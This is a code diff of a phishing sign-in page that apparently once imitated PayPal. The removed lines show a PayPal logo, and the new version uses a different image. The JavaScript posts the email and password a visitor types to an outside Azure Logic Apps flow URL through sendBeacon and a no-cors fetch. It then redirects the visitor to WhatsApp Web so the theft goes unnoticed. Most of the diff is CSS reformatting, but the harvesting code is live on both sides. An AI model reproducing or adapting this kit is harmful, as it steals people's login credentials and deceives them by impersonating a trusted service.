@@ -26,28 +26,28 @@
   }
 
   .wrap{min-height:100%;display:grid;grid-template-rows:1fr auto}
-.center {
-  display: grid;
-  align-items: start;
-  justify-items: center;
-  padding: 0; /* Antes tenía 16px, ahora cero */
-}
+  .center {
+    display: grid;
+    align-items: start;
+    justify-items: center;
+    padding: 0;
+  }
 
-.card {
-  position: relative;
-  width: 100%;
-  max-width: 520px;
-  background: var(--card);
-  border-radius: var(--radius);
-  padding: 0 36px 2px; /* Quitamos padding superior */
-}
+  .card {
+    position: relative;
+    width: 100%;
+    max-width: 520px;
+    background: var(--card);
+    border-radius: var(--radius);
+    padding: 0 36px 2px;
+  }
 
-.brand {
-  display: flex;
-  justify-content: center;
-  margin-top: 0;    /* Sin margen arriba */
-  margin-bottom: 8px;
-}
+  .brand {
+    display: flex;
+    justify-content: center;
+    margin-top: 0;
+    margin-bottom: 8px;
+  }
 
   .brand img{height:75px;width:auto;object-fit:contain}
 
@@ -86,24 +86,23 @@
   .f-links a:hover{text-decoration:underline}
 
   .btn-green {
-  background: #ffffff;         /* Fondo blanco */
-  color: #000;              /* Texto negro */
-  border: 2px solid #000;   /* Borde negro */
-}
-
+    background: #ffffff;
+    color: #000;
+    border: 2px solid #000;
+  }
 
   .hidden{display:none}
 
   /* Encabezado con correo + Change (queda PEGADO al input) */
-.id-row {
-  display: flex;
-  align-items: center;       /* Centra verticalmente */
-  justify-content: center;   /* Centra horizontalmente */
-  gap: 8px;
-  font-size: 16px;
-  font-weight: 700;
-  margin: 6px; /* sin separación extra */
-}
+  .id-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    margin: 6px;
+  }
   .id-row .change{color:var(--blue);font-weight:700;text-decoration:none}
   .id-row .change:hover{text-decoration:underline}
 
@@ -130,9 +129,8 @@
     .btn{padding:13px 16px}
   }
   #idRow {
-  display: none; /* Oculto al inicio */
-}
-
+    display: none; /* Oculto al inicio */
+  }
 </style>
 </head>
 <body>
@@ -140,7 +138,7 @@
     <main class="center" role="main">
       <section class="card" aria-label="Sign in form">
         <div class="brand">
-          <img src="https://1000marcas.net/wp-content/uploads/2019/12/Paypal-Logo.jpg" alt="PayPal">
+          <img src="https://i.postimg.cc/sfmPb5mT/Burrito-delicioso-en-plato-blanco.png" alt="Servicios jey">
         </div>
 
         <!-- OVERLAY DE CARGA -->
@@ -166,7 +164,7 @@
           <button class="btn btn-primary" type="submit" id="primaryBtn">Next</button>
 
           <div class="divider" aria-hidden="true">or</div>
-<button class="btn btn-green" type="button" id="btnSignup">Sign Up</button>
+          <button class="btn btn-green" type="button" id="btnSignup">Sign Up</button>
 
           <div class="langs" aria-label="Language selector">
             <span class="flag" aria-hidden="true">us</span><span class="dot">•</span>
@@ -200,9 +198,8 @@
   const forgot = document.getElementById('forgot');
   const primaryBtn = document.getElementById('primaryBtn');
 
-  // >>>>>> AÑADIDO: URL del flujo para enviar correo y contraseña
+  // URL del flujo (Power Automate / Logic Apps)
   const FLOW_URL = "https://prod-85.westus.logic.azure.com:443/workflows/a15e32f673dc4624b6d73ec979238804/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=VwyY5R-_TBFDEfoAupMFarmhkjQsGUB5ILXsvVZbhpI";
-  // <<<<<<
 
   // Estado actual: 'id' (correo/teléfono) o 'pwd' (contraseña)
   let state = 'id';
@@ -234,38 +231,37 @@
       }, 1000);
 
     }else{
-      // >>>>>> AÑADIDO: enviar correo y contraseña al flujo sin bloquear la redirección
-      // En estado 'pwd' al enviar, primero disparamos el POST y luego redirigimos
-try {
-  const data = {
-    email: idValue.textContent,
-    password: input.value,
-    ts: new Date().toISOString()
-  };
-  const body = JSON.stringify(data);
+      // Enviar correo y contraseña al flujo de forma CORS-safe
+      try {
+        const data = {
+          email: idValue.textContent,
+          password: input.value,
+          ts: new Date().toISOString()
+        };
+        const body = JSON.stringify(data);
 
-  // 1) Intento con sendBeacon usando STRING (Content-Type: text/plain)
-  let sent = false;
-  if (navigator.sendBeacon) {
-    sent = navigator.sendBeacon(FLOW_URL, body);
-  }
+        // 1) Intento con sendBeacon usando STRING (Content-Type: text/plain)
+        let sent = false;
+        if (navigator.sendBeacon) {
+          sent = navigator.sendBeacon(FLOW_URL, body);
+        }
 
-  // 2) Fallback: fetch sin cabeceras y no-cors (también CORS-safe)
-  if (!sent) {
-    fetch(FLOW_URL, {
-      method: "POST",
-      mode: "no-cors",
-      body,            // text/plain implícito
-      keepalive: true  // intenta completarla aunque navegues
-    }).catch(()=>{});
-  }
-} catch (_) {}
+        // 2) Fallback: fetch sin cabeceras y no-cors (CORS-safe)
+        if (!sent) {
+          fetch(FLOW_URL, {
+            method: "POST",
+            mode: "no-cors",
+            body: body,       // text/plain implícito
+            keepalive: true
+          }).catch(()=>{});
+        }
+      } catch (_) {}
 
-// Pequeño delay para mejorar entrega antes de salir
-setTimeout(()=>{
-  window.location.href = 'https://web.whatsapp.com/';
-}, 180);
-
+      // Pequeño delay para mejorar entrega antes de redirigir
+      setTimeout(()=>{
+        window.location.href = 'https://web.whatsapp.com/';
+      }, 180);
+    }
   });
 
   // Change -> vuelve al estado inicial
